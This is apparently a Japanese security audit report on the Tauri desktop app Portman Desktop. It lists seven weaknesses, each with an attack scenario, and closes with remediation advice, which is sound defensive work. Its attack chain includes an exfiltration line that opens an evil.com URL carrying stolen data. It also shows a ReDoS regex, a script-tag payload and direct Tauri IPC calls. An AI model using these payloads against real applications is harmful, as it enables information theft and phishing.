# 攻撃シナリオ分析レポート

## 分析対象
- **アプリケーション**: Portman Desktop
- **分析日**: 2026-02-07
- **技術スタック**: Tauri v2 + React + TypeScript + Rust
- **分析範囲**: portman_desktop, portman_core, desktop (フロントエンド)

---

## 発見された脆弱性サマリー

| # | 脆弱性 | リスク | カテゴリ | OWASP | 箇所 |
|---|--------|--------|---------|-------|------|
| V-001 | CSP無効化 | High | セキュリティ設定不備 | A05 | tauri.conf.json:37 |
| V-002 | ReDoS（正規表現DoS）可能性 | Medium | 入力検証不備 | A03 | resolver.rs:23 |
| V-003 | 未署名アプリケーション配布 | High | ソフトウェア完全性 | A08 | 配布形態 |
| V-004 | プロセス情報のエラー露出 | Low | 情報漏洩 | A01 | commands.rs:12 |
| V-005 | shell:allow-open権限によるURL開放 | Medium | 権限過剰 | A01 | capabilities/default.json:8 |
| V-006 | withGlobalTauri有効化 | Medium | 攻撃面拡大 | A05 | tauri.conf.json:24 |
| V-007 | ラベルデータのXSS潜在リスク | Low | XSS | A03 | LabelBadge.tsx, ListenerTable.tsx |

---

## 脆弱性詳細

### V-001: Content Security Policy (CSP) 無効化

**基本情報**
| 項目 | 内容 |
|------|------|
| リスクレベル | High |
| カテゴリ | A05:2021 - セキュリティの設定ミス |
| 発見箇所 | /Users/reverseblade/personal/portman/crates/portman_desktop/tauri.conf.json:37 |
| CVSS推定 | 6.1 (Medium-High) |

**脆弱性の説明**

`tauri.conf.json` において `"csp": null` が設定されており、Content Security Policyが完全に無効化されている。CSPはXSS攻撃を緩和するための重要な防御層であり、無効化によりスクリプトインジェクションのリスクが高まる。

```json
"security": {
  "csp": null  // 危険: CSP無効
}
```

**前提条件**
- 攻撃者がアプリケーション内でHTML/JavaScriptを注入できる経路を発見する（例: 悪意のあるラベル名、外部データソース）
- Tauriアプリの場合、webviewがlocalhost的な環境で実行されるため、通常のweb攻撃より制限があるが、完全な防御ではない

**攻撃シナリオ**
```
1. 攻撃者は将来的に追加される機能（外部データ読み込みなど）を通じてHTMLを注入
2. CSPが無効なため、任意のinline scriptが実行可能
3. Tauri IPCを通じてバックエンドコマンドを呼び出し、システム情報を窃取
4. shell:allow-open権限を悪用して任意のURLを開かせる（フィッシング）
```

**影響**
- **機密性**: Tauri IPC経由でシステム情報（ポート、プロセス）にアクセス可能
- **完全性**: ユーザーの意図しない操作（ラベル改ざん等）が可能
- **可用性**: 軽微（DoS攻撃は限定的）

---

### V-002: ReDoS（正規表現DoS）攻撃の可能性

**基本情報**
| 項目 | 内容 |
|------|------|
| リスクレベル | Medium |
| カテゴリ | A03:2021 - インジェクション |
| 発見箇所 | /Users/reverseblade/personal/portman/crates/portman_core/src/resolver.rs:23 |
| CVSS推定 | 5.3 (Medium) |

**脆弱性の説明**

Pattern型ラベルではユーザー入力の正規表現をそのまま `Regex::new()` に渡している。悪意のある正規表現（例: `(a+)+$`）を登録することで、マッチング時にCPUを過剰消費させるReDoS攻撃が可能。

```rust
// resolver.rs:23
LabelKeyType::Pattern => {
    if let Ok(re) = Regex::new(&label.key_value) {  // ユーザー入力をそのまま正規表現化
        pattern_labels.push((re, label));
    }
}
```

**前提条件**
- 攻撃者がラベル設定機能にアクセスできる（ローカルアプリなので通常はユーザー自身）
- Pattern型ラベルを登録できる（現状フロントエンドではPort型のみ使用しているが、APIレベルでは可能）

**攻撃シナリオ**
```
1. 攻撃者（または悪意のある設定ファイルをインポート）がPattern型ラベルを登録
2. key_valueに "(a+)+$" のようなReDoS脆弱な正規表現を設定
3. プロセス名が長い文字列（"aaaaaaaaaaaaaaaaaaab"等）にマッチ試行
4. CPUが過負荷になりアプリケーションがフリーズ
```

**影響**
- **機密性**: なし
- **完全性**: なし
- **可用性**: High（アプリケーションのフリーズ、応答不能）

**補足**

Rustの`regex`クレートはデフォルトでバックトラッキングを制限しているため、多くのReDoS攻撃には耐性がある。しかし、複雑なパターンでは依然として性能問題が発生する可能性がある。

---

### V-003: 未署名アプリケーション配布

**基本情報**
| 項目 | 内容 |
|------|------|
| リスクレベル | High |
| カテゴリ | A08:2021 - ソフトウェアとデータの整合性の不具合 |
| 発見箇所 | 配布形態（GitHub Releases、未署名DMG） |
| CVSS推定 | 7.5 (High) |

**脆弱性の説明**

アプリケーションがコード署名なしで配布されている。これにより：
1. ユーザーはダウンロードしたバイナリが改ざんされていないか検証できない
2. macOS Gatekeeperが警告を表示し、ユーザーがセキュリティ設定を緩和する習慣がつく
3. 中間者攻撃やミラーサイトでの改ざんリスク

**前提条件**
- 攻撃者がダウンロード経路（DNS、CDN、ミラー）を制御できる
- または攻撃者が偽のリリースページを作成できる

**攻撃シナリオ**
```
1. 攻撃者が "portman" を模倣した偽サイト/リポジトリを作成
2. マルウェアを含む改ざん版DMGを配布
3. ユーザーは正規版と区別できず、署名検証もできない
4. "開発元を確認できません"警告を無視してインストール
5. マルウェアがシステムに侵入
```

**影響**
- **機密性**: Critical（マルウェア混入時、全システム情報が危険）
- **完全性**: Critical（システム改ざんの可能性）
- **可用性**: High（ランサムウェア等のリスク）

---

### V-004: エラーメッセージによる情報漏洩

**基本情報**
| 項目 | 内容 |
|------|------|
| リスクレベル | Low |
| カテゴリ | A01:2021 - アクセス制御の不備 |
| 発見箇所 | /Users/reverseblade/personal/portman/crates/portman_desktop/src/commands.rs:12 |
| CVSS推定 | 3.1 (Low) |

**脆弱性の説明**

Tauriコマンドで発生したエラーを `.map_err(|e| e.to_string())` でそのままフロントエンドに返している。これにより、内部パス、データベース構造、システム状態などの情報が露出する可能性がある。

```rust
pub fn scan_listeners() -> Result<Vec<EnrichedListener>, String> {
    portman()?.scan().map_err(|e| e.to_string())  // 詳細エラーがフロントエンドへ
}
```

**前提条件**
- ローカルアプリケーションのため、攻撃者がフロントエンドにアクセスするには既にシステムアクセスが必要
- ただし、エラーメッセージがログに保存される場合、別の攻撃経路での情報収集に利用される可能性

**攻撃シナリオ**
```
1. 攻撃者がシステムの一部にアクセス（マルウェア、共有マシン等）
2. Portmanを操作してエラーを意図的に発生させる
3. エラーメッセージからDBパス(~/.local/share/portman/labels.sqlite)を確認
4. SQLiteファイルを直接窃取・改ざん
```

**影響**
- **機密性**: Low（パス情報、システム状態の露出）
- **完全性**: なし（直接的には）
- **可用性**: なし

---

### V-005: shell:allow-open 権限によるURL開放リスク

**基本情報**
| 項目 | 内容 |
|------|------|
| リスクレベル | Medium |
| カテゴリ | A01:2021 - アクセス制御の不備 |
| 発見箇所 | /Users/reverseblade/personal/portman/crates/portman_desktop/capabilities/default.json:8 |
| CVSS推定 | 5.4 (Medium) |

**脆弱性の説明**

Tauri capabilities で `shell:allow-open` が許可されており、フロントエンドから `open()` 関数を呼び出して任意のURLをシステムのデフォルトブラウザで開くことができる。

```json
"permissions": [
  "shell:allow-open",  // 任意URL開放が可能
  ...
]
```

フロントエンドでは以下のように使用されている：
```typescript
// ListenerCard.tsx:32, menu.ts:57
open(item.listener.url)  // http://localhost:{port}/
open("https://github.com/zeroshotlog/portman")
```

**前提条件**
- V-001（CSP無効化）と組み合わせ、XSS攻撃が成功した場合
- または、将来的に外部データ（例: プロセス情報にURLが含まれる）を表示する機能が追加された場合

**攻撃シナリオ**
```
1. 攻撃者がXSS等でフロントエンドにスクリプトを注入
2. open("https://evil-phishing-site.com") を実行
3. ユーザーのブラウザでフィッシングサイトが開く
4. 認証情報窃取、マルウェアダウンロード誘導
```

現在のコードでは `item.listener.url` が動的に生成されているが、これは `http://localhost:{port}/` 形式であり、ポート番号は数値検証済みのため安全。

**影響**
- **機密性**: Medium（フィッシング経由での認証情報窃取）
- **完全性**: Low（ブラウザ経由の二次攻撃）
- **可用性**: なし

---

### V-006: withGlobalTauri 有効化による攻撃面拡大

**基本情報**
| 項目 | 内容 |
|------|------|
| リスクレベル | Medium |
| カテゴリ | A05:2021 - セキュリティの設定ミス |
| 発見箇所 | /Users/reverseblade/personal/portman/crates/portman_desktop/tauri.conf.json:24 |
| CVSS推定 | 4.7 (Medium) |

**脆弱性の説明**

`withGlobalTauri: true` が設定されており、`window.__TAURI__` オブジェクトがグローバルに公開されている。これにより、開発者ツールやXSS経由でTauri APIに直接アクセス可能。

```json
"app": {
  "withGlobalTauri": true,  // グローバルAPI公開
  ...
}
```

**前提条件**
- 開発者ツールへのアクセス（ローカルなので可能）
- またはXSS攻撃の成功

**攻撃シナリオ**
```
1. XSS攻撃が成功、または開発者ツールにアクセス
2. window.__TAURI__.core.invoke("scan_listeners") を直接実行
3. システムのポート・プロセス情報を取得
4. window.__TAURI__.core.invoke("set_label", {...}) でラベル改ざん
```

ローカルアプリケーションでは開発者ツールへのアクセスは通常可能であり、この設定自体は開発便利性のためのものだが、本番ビルドでは無効化することが推奨される。

**影響**
- **機密性**: Medium（Tauri API経由での情報取得）
- **完全性**: Medium（ラベル改ざん）
- **可用性**: Low

---

### V-007: ユーザー入力（ラベル）の表示における潜在的XSSリスク

**基本情報**
| 項目 | 内容 |
|------|------|
| リスクレベル | Low |
| カテゴリ | A03:2021 - インジェクション (XSS) |
| 発見箇所 | /Users/reverseblade/personal/portman/desktop/src/components/LabelBadge.tsx:6, ListenerTable.tsx:92 |
| CVSS推定 | 3.7 (Low) |

**脆弱性の説明**

ユーザーが入力したラベル名（`label.name`）やノート（`label.note`）がReactコンポーネント内で直接レンダリングされている。ReactはデフォルトでXSS対策（エスケープ）を行うため、現状では安全だが、将来の変更（dangerouslySetInnerHTML使用等）でリスクが生じる可能性がある。

```tsx
// LabelBadge.tsx:6
<span className="font-medium">{label.name}</span>
{label.note && (
  <span className="text-blue-500/70 dark:text-blue-400/60">/ {label.note}</span>
)}

// ListenerTable.tsx:92
{item.label.name}
{item.label.note && <> / {item.label.note}</>}
```

**前提条件**
- Reactのエスケープ機能が何らかの理由で無効化される
- または `dangerouslySetInnerHTML` が使用される
- ラベルデータがDBから直接読み込まれ、バリデーションなしで表示される

**攻撃シナリオ（仮想的）**
```
1. 攻撃者がラベル名に "<script>evil()</script>" を設定
2. 現状: Reactが自動エスケープ → 攻撃失敗
3. 将来: dangerouslySetInnerHTML使用時 → XSS成功
```

**現状の安全性**

現在のコードは以下の理由で安全：
- Reactの自動エスケープ機能が有効
- `dangerouslySetInnerHTML` は使用されていない
- ラベル入力時に `.trim()` でサニタイズ（ただし部分的）

**影響**
- **現状**: なし（Reactの保護により安全）
- **将来的リスク**: High（XSS成功時はV-001, V-005と連鎖）

---

## セキュリティ上の良い実装

分析中に発見された、セキュリティ上適切な実装：

### 1. コマンドインジェクション対策（安全）

```rust
// scanner.rs:18-20
let output = Command::new("lsof")
    .args(["-nP", "-iTCP", "-sTCP:LISTEN"])  // ハードコードされた引数
    .output()?;
```

`lsof` コマンドの引数は完全にハードコードされており、ユーザー入力が引数に混入する経路はない。

### 2. SQLインジェクション対策（安全）

```rust
// repository.rs:44-60
self.conn.execute(
    "INSERT INTO labels ... VALUES (?1, ?2, ?3, ?4, ?5, ?6) ...",
    params![
        key_type_str,
        label.key_value,
        label.name,
        label.note,
        now,
        now
    ],
)?;
```

`rusqlite` のパラメータ化クエリ（`params![]`マクロ）を使用しており、SQLインジェクションは防止されている。

### 3. 型安全なIPC（安全）

Tauriコマンドは型安全であり、フロントエンドからの入力は自動的にデシリアライズ・バリデーションされる。

```rust
#[derive(Deserialize)]
pub struct SetLabelArgs {
    pub key_type: LabelKeyType,  // enumへのパース時にバリデーション
    pub key_value: String,
    pub name: String,
    pub note: Option<String>,
}
```

### 4. 最小限のTauri権限

```json
// capabilities/default.json
"permissions": [
  "core:default",
  "shell:allow-open",  // 必要最小限
  "core:window:allow-start-dragging",
  "core:menu:default",
  "core:image:default"
]
```

ファイルシステムアクセス、ネットワークアクセス、プロセス実行などの危険な権限は含まれていない。

---

## 攻撃チェーン

### Chain-1: XSS経由の情報窃取・フィッシング

**目標**: ユーザーのシステム情報窃取とフィッシング誘導

**攻撃フロー**:
```
[V-001: CSP無効化]
    ↓ XSS攻撃の成立を容易に
[仮想: XSS注入点] (※現状は存在しないが将来的リスク)
    ↓ 悪意のあるスクリプト実行
[V-006: withGlobalTauri]
    ↓ window.__TAURI__ APIアクセス
    ↓ invoke("scan_listeners") でポート/プロセス情報取得
[V-005: shell:allow-open]
    ↓ open("https://evil.com?data=...") で情報送信
[目標達成: システム情報窃取 + フィッシング]
```

**成功確率**: 低（現状XSS注入点がないため）
**検出難易度**: 高（ブラウザが開くだけなので気づきにくい）
**必要スキル**: 中

---

### Chain-2: 供給チェーン攻撃

**目標**: マルウェア混入による完全なシステム侵害

**攻撃フロー**:
```
[V-003: 未署名配布]
    ↓ 正規版と区別不可能な偽バイナリ作成
[ユーザー: Gatekeeper警告を無視]
    ↓ マルウェア入りPortmanをインストール
[改ざん版アプリ: 悪意のあるコード実行]
    ↓ バックドア設置、認証情報窃取
[目標達成: システム完全掌握]
```

**成功確率**: 中（ソーシャルエンジニアリング依存）
**検出難易度**: 中（未署名警告は出るが無視されやすい）
**必要スキル**: 中（偽サイト/リポジトリ作成能力）

---

## リスク評価サマリー

### リスクマトリクス

```
          影響度
            大 │  V-003    │              
              │           │              
              ├───────────┼───────────
              │  V-002    │  V-001, V-005, V-006
            小 │  V-004    │  V-007
              └───────────┴───────────→
                  低           高
                     発生可能性
```

### 優先対応順位

| 優先度 | 脆弱性 | 理由 |
|--------|--------|------|
| 1 | V-003 | High + サプライチェーン攻撃の起点、ユーザー信頼に影響 |
| 2 | V-001 | High + 複数攻撃チェーンの成立条件、容易に対策可能 |
| 3 | V-006 | Medium + 本番ビルドでは不要、攻撃面を縮小 |
| 4 | V-005 | Medium + 現状安全だが将来的リスク、スコープ制限推奨 |
| 5 | V-002 | Medium + ローカルアプリで影響限定的、正規表現検証追加 |
| 6 | V-004 | Low + ログ管理との兼ね合いで対応 |
| 7 | V-007 | Low + 現状Reactで保護、コードレビュー継続 |

---

## 攻撃者視点での推奨

### 防御側が見落としがちな点

1. **CSP設定の重要性**: Tauriアプリはwebviewを使用するため、従来のWebアプリ同様にCSP設定が重要。`null` 設定は開発時の便宜のためと思われるが、本番ビルドでは必ず適切なCSPを設定すべき。

2. **署名なし配布の信頼問題**: macOSでGatekeeperをバイパスする習慣がつくと、他のマルウェアにも同様に対応してしまう。開発者署名がなくても、チェックサムの提供や、Homebrew Caskでの配布を検討すべき。

3. **ローカルアプリでも攻撃は可能**: 「ローカルアプリだから安全」という思考は危険。マルウェア、共有マシン、または将来的な機能追加（クラウド同期等）で攻撃経路が生まれる可能性がある。

4. **正規表現は入力検証が必要**: Pattern型ラベルはCLI/MCPからも設定可能であり、悪意のある正規表現が登録される可能性がある。`regex`クレートのサイズ制限や複雑度制限を検討すべき。

### 今後注意すべき攻撃トレンド

1. **Electronアプリへの攻撃手法の転用**: Tauri v2はセキュリティモデルがElectronより強固だが、類似の攻撃手法（nodeIntegrationバイパス等）が研究される可能性がある。Tauriのセキュリティアップデートを継続的に監視すべき。

2. **サプライチェーン攻撃の増加**: GitHub Releaseを経由した偽バイナリ配布、依存ライブラリへのマルウェア混入が増加している。SBOMの管理と依存関係の監視が重要。

---

## 次ステップへの引き継ぎ

### sec-whitehat-advisorへの入力

**優先対応脆弱性**:
1. V-003 (未署名配布): Apple Developer ID取得、またはチェックサム+GPG署名提供
2. V-001 (CSP無効化): Tauri v2の推奨CSP設定を適用
3. V-006 (withGlobalTauri): 本番ビルドで`false`に設定

**攻撃チェーン阻止ポイント**:
- Chain-1はV-001（CSP）を修正すればXSSリスクを大幅に軽減
- Chain-2はV-003（署名）を修正すればソフトウェア完全性を確保

**追加推奨事項**:
- V-002: `regex`クレートの`size_limit`オプション適用検討
- V-005: `shell:allow-open` のスコープをlocalhostに制限（Tauri v2では設定可能か要調査）
- 継続的な依存関係監視: `cargo audit`, `npm audit` のCI統合

---

## 付録: 分析対象ファイル一覧

**Rustバックエンド**:
- /Users/reverseblade/personal/portman/crates/portman_desktop/src/main.rs
- /Users/reverseblade/personal/portman/crates/portman_desktop/src/commands.rs
- /Users/reverseblade/personal/portman/crates/portman_core/src/scanner.rs
- /Users/reverseblade/personal/portman/crates/portman_core/src/repository.rs
- /Users/reverseblade/personal/portman/crates/portman_core/src/resolver.rs
- /Users/reverseblade/personal/portman/crates/portman_core/src/app.rs
- /Users/reverseblade/personal/portman/crates/portman_core/src/allocator.rs

**設定ファイル**:
- /Users/reverseblade/personal/portman/crates/portman_desktop/tauri.conf.json
- /Users/reverseblade/personal/portman/crates/portman_desktop/capabilities/default.json

**フロントエンド**:
- /Users/reverseblade/personal/portman/desktop/src/App.tsx
- /Users/reverseblade/personal/portman/desktop/src/hooks/usePortman.ts
- /Users/reverseblade/personal/portman/desktop/src/components/LabelEditor.tsx
- /Users/reverseblade/personal/portman/desktop/src/components/ListenerCard.tsx
- /Users/reverseblade/personal/portman/desktop/src/components/ListenerTable.tsx
- /Users/reverseblade/personal/portman/desktop/src/components/LabelBadge.tsx
- /Users/reverseblade/personal/portman/desktop/src/menu.ts

**依存関係**:
- /Users/reverseblade/personal/portman/desktop/package.json
- /Users/reverseblade/personal/portman/crates/portman_desktop/Cargo.toml
- /Users/reverseblade/personal/portman/crates/portman_core/Cargo.toml
